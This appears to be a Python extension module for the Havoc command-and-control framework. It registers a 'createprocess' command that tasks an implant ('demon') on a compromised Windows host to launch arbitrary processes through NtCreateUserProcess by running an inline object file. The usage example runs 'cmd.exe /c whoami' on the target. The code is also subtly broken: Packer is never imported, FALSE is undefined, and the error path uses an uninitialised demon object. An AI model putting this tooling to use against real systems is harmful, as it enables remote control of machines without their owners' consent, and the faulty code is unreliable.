from havoc import Demon, RegisterCommand, RegisterModule


def CreateProcess(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    dumpPath: str = None

    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "wrong parameters!")
        return FALSE
    match len(args):
        case 1:
            packer.addWstr(args[0]) # Binary path
            packer.addWstr('')      # Command line arg
            packer.addint(0)        # Exit
        case 2:
            packer.addWstr(args[0]) # Binary path
            packer.addWstr(args[1]) # Command line arg
            packer.addint(0)        # Exit
        case 3:
            packer.addWstr(args[0]) # Binary path
            packer.addWstr(args[1]) # Command line arg
            if int(args[2]) == 1:
                packer.addint(1)    # NO Exit
            else:
                packer.addint(0)    # Exit
    demon = Demon(demon_id)
    task_id = demon.ConsoleWrite(
        demon.CONSOLE_TASK, "Tasked the demon start a process via NtCreateUserProcess")
    demon.InlineExecute(
        task_id, "go", f"./bin/createprocess.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return task_id


RegisterCommand(CreateProcess, "", "createprocess",
                "create process via NtCreateUserProcess", 0, "[binary path on target] [/opt:arg] [/opt:(1/0) 1 is no exit, 0 is normal]", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding 1 <--> C:\\Windows\\System32\\cmd.exe \"/c whoami\" 0")
